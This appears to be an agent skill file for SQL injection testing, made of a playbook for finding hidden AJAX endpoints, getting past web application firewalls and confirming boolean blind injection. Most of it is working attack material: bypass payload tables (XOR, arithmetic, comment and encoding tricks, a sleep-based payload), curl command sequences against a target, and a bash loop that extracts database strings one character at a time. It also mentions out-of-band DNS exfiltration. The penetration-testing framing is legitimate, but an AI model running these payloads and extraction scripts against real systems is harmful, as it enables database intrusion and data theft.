---
name: sql-injection-testing
description: "SQL injection hunting end to end — hidden AJAX endpoint discovery from inline JS, WAF-bypass payloads (XOR/arithmetic operators, EXEC() wrapper, comment injection), boolean blind differential analysis, header and cookie injection, and proof by SLEEP or data extraction. Use when testing any parameter that reaches a database, when a WAF returns 403 on classic payloads but single quotes pass through, or when a previous SQLi sweep found nothing and the sweep is suspected to have been shallow."
---

# SQL Injection Testing

A WAF returning 403 on `OR 1=1` is not evidence that a parameter is safe — it is evidence that one payload shape is filtered. Most missed SQLi in this project came from stopping there. The workflow below exists to keep the search going past that point: find the endpoints nobody fuzzed, get a payload past the filter, and read the answer from a response differential rather than from an error message.

**The failure this skill was written from**: a confirmed boolean blind SQLi was missed because the AJAX endpoint was buried in inline JS, requests went out without `X-Requested-With`, only one parameter was tested, only classic payloads were tried, and a WAF 403 was read as "sanitized" — while the single quote itself was sailing through with a 200.

---

## Detailed playbooks

The workflow below is the spine; these files carry the depth for each stage. Read the one matching the stage you are in rather than loading them all.

| Stage | File |
|---|---|
| Find the endpoints — AJAX/hidden endpoint discovery from inline JS | `references/ajax-endpoint-discovery.md` |
| Get past the filter — full WAF-bypass payload taxonomy | `references/waf-bypass-payloads.md` |
| Read the answer — boolean blind differential detection | `references/boolean-blind-differential.md` |
| Cover the surface — systematic parameter testing | `references/systematic-parameter-testing.md` |
| Cover the formats — JSON/XML/SOAP/multipart/header/cookie request shapes | `references/request-format-coverage.md` |
| Engine-specific — .NET loose typing (no quotes needed) | `references/dotnet-loose-type-sqli.md` |
| Engine-specific — PDO/prepared-statement bypasses | `references/pdo-prepared-statement-sqli.md` |
| Non-SQL datastores — NoSQL injection (Mongo, CouchDB, Redis) | `references/nosqli-techniques.md` |
| Post-mortem — knowledge we already had and ignored | `references/postmortem-knowledge-gaps.md` |

## Second-order SQL injection

Also called stored SQLi. Input is safely escaped when it is **stored**, then used unescaped by a *different* code path later. Because the injection does not fire at the point of entry, a parameter sweep that only checks immediate responses will report the whole application clean.

Where it hides:
- Registration → the username is escaped on insert, then concatenated into a query by an admin report, a profile page, or a nightly batch job
- Any value written once and read by many features (display name, address, comment, filename, tag)
- Import/bulk-upload flows, where the parser trusts data that already lives in the database

How to hunt it, given the delayed trigger:
1. **Plant markers, do not just fuzz.** Store distinctive payloads (`'||(SELECT '')||'`, `'` alone, a time-delay payload) in every writable field, keeping a note of which value went where.
2. **Then walk every feature that reads them back** — profile view, search results, admin lists, exports, emails, PDF renders. The error may appear in a completely different part of the app, minutes later.
3. **Prefer out-of-band and time-based payloads** here, because you may never see the response that triggers. A DNS callback from a batch job is often the only signal you get.
4. When a stored value produces an error somewhere unexpected, trace back to which field carried it before assuming the *reading* endpoint is the vulnerable one.

The same mechanism produces second-order flaws in other classes — check `nosql-injection-testing` and `ssti-testing` for the equivalent patterns when the backend is not SQL.

## Anti-Patterns (What NOT to Do)

### Anti-Pattern 1: "WAF blocks standard payloads = no SQLi"

**THE FALLACY**: `OR 1=1` returns 403 → "Server sanitizes input, no SQLi possible."

**THE REALITY**: WAF blocking keywords (UNION, SELECT, OR, AND, SLEEP) means the WAF is doing keyword filtering. This tells you NOTHING about whether the application itself is vulnerable. The application and WAF are separate layers.

**WHAT TO DO INSTEAD**:
1. Determine WHAT the WAF blocks (keywords? quotes? operators?)
2. Test what PASSES through the WAF
3. Single quote `'` returning 200 (not 403) means the WAF does NOT block quotes
4. If quotes pass → the application itself handles them (or doesn't)
5. Use operator-based payloads (XOR, arithmetic, bitwise) that bypass keyword filters

**Decision tree**:
```
Send single quote (')
├── 403 → WAF blocks quotes → try encoding bypasses, then operator-only payloads
├── 500 → SQL error → CONFIRMED INJECTABLE (quotes reach DB unescaped)
├── 200, same content → quote may be escaped OR param not in SQL
└── 200, different content → QUOTE REACHES DB → test blind SQLi with operators
    ├── '^(1=1)^' vs '^(1=2)^' → different response → BOOLEAN BLIND CONFIRMED
    └── same response → try arithmetic: '-(1)-' vs '-(0)-'
```

### Anti-Pattern 2: "Single quote returns 200 same size = not injectable"

**THE FALLACY**: `colour=Black'` returns 200 with similar size → "Input is sanitized."

**THE REALITY**: The response being "similar size" on a full page (180KB) means nothing. A 2-byte difference IS significant on a 180KB page -- it could be the difference between "10 Cars found" and "4 Cars found" but buried in noise.

**WHAT TO DO INSTEAD**:
1. ALWAYS send `X-Requested-With: XMLHttpRequest` to get the AJAX fragment
2. Compare CONTENT, not just size
3. Run baseline calibration (same request 5x) to establish noise floor
4. Use the 3-request confirmation protocol
5. NEVER compare full-page responses for blind differentials

### Anti-Pattern 3: "No error message = no injection"

**THE FALLACY**: No SQL error in response → "Parameter is not injectable."

**THE REALITY**: Error-based SQLi is only ONE technique. The absence of errors could mean:
- Custom error handling (catches exceptions, returns generic response)
- Production mode (errors suppressed)
- Blind context (query runs in background, results influence content indirectly)

**WHAT TO DO INSTEAD**:
1. Error-based is just the first check
2. Always proceed to boolean blind (content differential)
3. Always proceed to time-based blind (SLEEP/BENCHMARK)
4. Always try out-of-band (DNS exfil via interactsh)
5. A parameter that reaches the DB without errors is EXACTLY the kind that has boolean blind SQLi

### Anti-Pattern 4: "Only testing the primary parameter"

**THE FALLACY**: The main `keyword` search is the injection target. Other parameters are just filters.

**THE REALITY**: Main search parameters are typically the MOST secured because developers focus on them. Filter parameters, sort parameters, and pagination parameters are frequently forgotten in security reviews.

**WHAT TO DO INSTEAD**:
- Test EVERY parameter, prioritized by the table in 4.3
- Filter parameters (facets like colour, make, model) are highest priority
- Parameters passed via AJAX actions are often less secured than form-submitted parameters

### Anti-Pattern 5: "Premature conclusion after WAF 403"

**THE FALLACY**: "Tried 5 payloads, all got 403. Moving on to the next target."

**THE REALITY**: You tested 5 payloads from the SAME category (keyword-based). The WAF is designed to block exactly those. You need to test payloads from DIFFERENT categories (operators, encoding, protocol-level).

**MINIMUM PAYLOAD CATEGORIES before declaring no-SQLi**:

| # | Category | Example | Blocks = |
|---|----------|---------|----------|
| 1 | Classic keywords | `' OR 1=1--` | WAF keyword filter active |
| 2 | Single quote alone | `'` | Quote blocking (rare) or passes (promising) |
| 3 | Quote + comment | `'--` or `'#` | Determines if IN sql context |
| 4 | XOR operator | `'^(1=1)^'` | Bitwise operator handling |
| 5 | Arithmetic | `'-(1)-'` | Math operator handling |
| 6 | Comparison | `' AND 1 LIKE 1--` | Alternative keyword handling |
| 7 | Version comment | `'/*!50000AND*/1=1--` | MySQL-specific bypass |
| 8 | Encoding (double URL) | `%2527` | Multi-decode handling |
| 9 | Time-based (alt) | `'^(BENCHMARK(5000000,SHA1(1)))^'` | Time function handling |
| 10 | Content-type switch | Same payload via JSON body | Body parser differences |

**RULE**: You MUST test payloads from at least 6 of these 10 categories before concluding "no SQLi". If you only tested category 1, you tested 10% of the attack surface.

### Anti-Pattern 6: "Ignoring your own memory rules"

We had `feedback_null_propagation_xor_oracle.md` explicitly saying to use XOR for blind SQLi, and `feedback_deep_fuzz_gaps.md` rating our SQLi capability at 4/10. Both were ignored.

**WHAT TO DO INSTEAD**:
- Before EVERY SQLi test: read `payload-packs.json` sqli section
- Check `shared attack patterns` for XOR oracle pattern
- Review MEMORY.md rules related to SQLi
- Consult `waf-generic-evasion.md` and `waf-bypass.md`

---

## Integrated Workflow (Step-by-Step)

### Phase 1: Endpoint Discovery (BEFORE any injection testing)

```bash
# 1. Fetch full HTML with and without XHR header
curl -sk "https://TARGET/page" -o page_full.html
curl -sk "https://TARGET/page" -H "X-Requested-With: XMLHttpRequest" -o page_xhr.html
wc -c page_full.html page_xhr.html  # compare sizes

# 2. Extract ALL AJAX endpoints from HTML
grep -oP "action[=:]\s*['\"]?\w+['\"]?" page_full.html | sort -u
grep -oP "\$\.ajax|fetch\(|XMLHttpRequest" page_full.html
grep -oP "url\s*:\s*['\"][^'\"]+['\"]" page_full.html

# 3. Extract all parameters
grep -oP 'name="[^"]+"' page_full.html | sort -u
grep -oP "data\s*:\s*\{[^}]+\}" page_full.html

# 4. Playwright interactive capture (if inline JS not enough)
# Use page.on('request') + interact with all filters/dropdowns

# 5. Build endpoint+parameter inventory before testing
```

### Phase 2: Per-Parameter Testing (WAF-aware)

```bash
# For each parameter, for each endpoint:

# A. Baseline (no injection)
curl -sk -X POST "https://TARGET/endpoint" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "action=handler&param=NORMAL_VALUE" \
  -o baseline.html
BASELINE_SIZE=$(wc -c < baseline.html)

# B. Quote test
curl -sk -X POST "https://TARGET/endpoint" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "action=handler&param=NORMAL_VALUE'" \
  -o quote_test.html -w "%{http_code}"
# 200 = quote passes WAF. 403 = WAF blocks quotes.

# C. If quote passes (200): XOR blind test
curl -sk -X POST "https://TARGET/endpoint" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "action=handler&param=NORMAL_VALUE'^(1=1)^'" \
  -o xor_true.html

curl -sk -X POST "https://TARGET/endpoint" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "action=handler&param=NORMAL_VALUE'^(1=2)^'" \
  -o xor_false.html

# D. Compare
diff xor_true.html xor_false.html
wc -c xor_true.html xor_false.html

# E. Confirm with 3-request protocol (true, false, true2)
# F. If confirmed: extract version to PROVE
curl -sk -X POST "https://TARGET/endpoint" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "action=handler&param=NORMAL_VALUE'^(ORD(MID(@@version,1,1))>52)^'" \
  -o version_test.html
```

### Phase 3: Data Extraction (after confirmation)

```bash
# Character-by-character extraction via XOR boolean blind
# For each position N in the string:
# Binary search on ORD value (0-127)

# Example: Extract @@version character by character
for pos in $(seq 1 20); do
  low=0; high=127
  while [ $low -lt $high ]; do
    mid=$(( (low + high) / 2 ))
    resp=$(curl -sk -X POST "https://TARGET/endpoint" \
      -H "X-Requested-With: XMLHttpRequest" \
      -d "action=handler&param=VALUE'^(ORD(MID(@@version,$pos,1))>$mid)^'" \
      -o /dev/null -w "%{size_download}")
    
    if [ "$resp" -eq "$TRUE_SIZE" ]; then
      low=$((mid + 1))
    else
      high=$mid
    fi
  done
  printf "\\$(printf '%03o' $low)"
done
echo
```

---

## Quick Reference Card

### AJAX Detection Grep Patterns
```
action=               # WordPress AJAX actions
$.ajax(               # jQuery AJAX calls
jQuery.ajax(          # jQuery AJAX (explicit)
fetch(                # Fetch API
XMLHttpRequest        # XHR
.open('POST           # XHR open
url:                  # jQuery AJAX url property
admin-ajax.php        # WordPress AJAX handler
wp-json               # WordPress REST API
/api/                 # Generic API paths
data: {               # jQuery AJAX data payload
serializeArray        # jQuery form serialization
FormData              # FormData API
```

### WAF-Bypass SQLi Operators (by evasion likelihood)
```
^    XOR (bitwise)        — almost never blocked
-    subtraction          — almost never blocked
*    multiplication       — rarely blocked
&    bitwise AND          — rarely blocked
|    bitwise OR           — rarely blocked
<>   not equal            — rarely blocked
LIKE                      — sometimes blocked
BETWEEN                   — rarely blocked
RLIKE/REGEXP              — sometimes blocked
CASE WHEN                 — sometimes blocked
DIV                       — rarely blocked
MOD                       — rarely blocked
```

### The "Quote Pass" Decision Tree
```
Send: param=VALUE'
├── HTTP 403        → WAF blocks quote → try %27, %2527, ＇
├── HTTP 500        → SQL error → CONFIRMED
├── HTTP 200, size differs from baseline  → quote changes query → BLIND LIKELY
│   └── Send: param=VALUE'^(1=1)^' vs VALUE'^(1=2)^'
│       ├── Different responses → BOOLEAN BLIND CONFIRMED
│       └── Same responses → try: VALUE'-(1)-' vs VALUE'-(0)-'
└── HTTP 200, size = baseline → quote may be escaped → try double-quote, backslash, %00'
```

### Memory Rules to Apply
- `feedback_null_propagation_xor_oracle.md`: XOR treats NULL=TRUE, use ISNULL()
- `feedback_deep_fuzz_gaps.md`: Self-assessed 4/10 SQLi, must use this methodology
- `feedback_akamai_soap_bypass.md`: 47+ WAF bypass techniques reference
- `feedback_legacy_asp_sqli_patterns.md`: Divide-by-zero oracle for ASP
- `payload-packs.json`: XOR payload already exists as `0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z`
- `shared attack patterns`: Pattern "NULL Propagation XOR Oracle" documented

---

## Changelog

- 2026-06-11: Created from post-mortem analysis of example.target.com boolean blind SQLi miss
- 2026-06-12: Added PART 6 — Request Format Coverage. Second miss: example.target.com multipart+JSON SQLi invisible to GET-param scanner. Defined 4-layer depth model

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/ajax-endpoint-discovery.md` — **PART 1: AJAX / Hidden Endpoint Discovery** — Modern web apps split logic across:
- `references/boolean-blind-differential.md` — **PART 3: Boolean Blind SQLi Differential Detection** — Many web frameworks return different responses based on whether the request is an AJAX call:
- `references/dotnet-loose-type-sqli.md` — **dotnet loose type sqli** — related_patterns:
- `references/pdo-prepared-statement-sqli.md` — **pdo prepared statement sqli** — related_patterns:
- `references/postmortem-knowledge-gaps.md` — **Appendix B: What Our Existing Knowledge Base Already Had (But We Ignored)** — | Source | What It Contained | How It Would Have Helped |
- `references/request-format-coverage.md` — **PART 6: Request Format Coverage (added 2026-06-12)** — A second SQLi was found on `www.example.target.com` (same xoxo platform, different country) using `multipart/f
- `references/systematic-parameter-testing.md` — **PART 4: Systematic Parameter Testing** — In our failure, we tested only `keyword` on the main search. The page had **10+ parameters**: `colour`, `make`
- `references/waf-bypass-payloads.md` — **PART 2: WAF Bypass SQLi Payloads (Complete Taxonomy)** — WAFs block keywords (`UNION`, `SELECT`, `SLEEP`, `OR`, `AND`). They rarely block **operators** because operato
